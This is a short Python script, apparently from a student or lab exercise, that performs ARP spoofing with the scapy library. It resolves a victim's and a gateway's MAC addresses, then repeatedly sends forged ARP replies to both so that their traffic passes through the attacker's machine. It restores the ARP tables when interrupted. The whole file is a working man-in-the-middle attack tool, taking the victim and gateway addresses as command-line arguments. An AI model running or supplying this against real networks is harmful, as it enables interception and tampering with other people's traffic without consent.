#!/usr/bin/env python3
import sys, time
import logging
from scapy.all import Ether, ARP, srp, send
from datetime import datetime
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

author = "Joel Beh Zhirong"
current_date = datetime.now().strftime("%d/%m/%Y")
print(f"Author: {author}")
print(f"Date: {current_date}")

def get_mac(ip):
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    answered = srp(pkt, timeout=2, verbose=False)[0]
    if not answered:
        print(f"[-] Could not resolve MAC for {ip}")
        sys.exit(1)
    return answered[0][1].hwsrc

def spoof(target_ip, target_mac, impersonate_ip):
    # op=2 ("is-at") tells target_ip that impersonate_ip lives at OUR mac
    send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=impersonate_ip), verbose=False)

def restore(dest_ip, dest_mac, real_ip, real_mac):
    send(ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=real_ip, hwsrc=real_mac), count=4, verbose=False)

def main():
    if len(sys.argv) != 3:
        print(f"Usage: sudo python3 {sys.argv[0]} <Victim_IP> <Gateway_IP>")
        sys.exit(1)
    victim_ip, gateway_ip = sys.argv[1], sys.argv[2]
    victim_mac  = get_mac(victim_ip)
    gateway_mac = get_mac(gateway_ip)
    print(f"[+] Victim {victim_ip} -> {victim_mac}")
    print(f"[+] Gateway {gateway_ip} -> {gateway_mac}")
    print("[*] Spoofing started. Ctrl+C to stop and restore ARP tables.")

    sent = 0
    try:
        while True:
            spoof(victim_ip, victim_mac, gateway_ip)   # lie to victim
            spoof(gateway_ip, gateway_mac, victim_ip)  # lie to gateway
            sent += 2
            print(f"\r[*] Packets sent: {sent}", end="")
            sys.stdout.flush()
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[*] Restoring ARP tables...")
        restore(victim_ip, victim_mac, gateway_ip, gateway_mac)
        restore(gateway_ip, gateway_mac, victim_ip, victim_mac)
        print("[+] Done.")

if __name__ == "__main__":
    main()
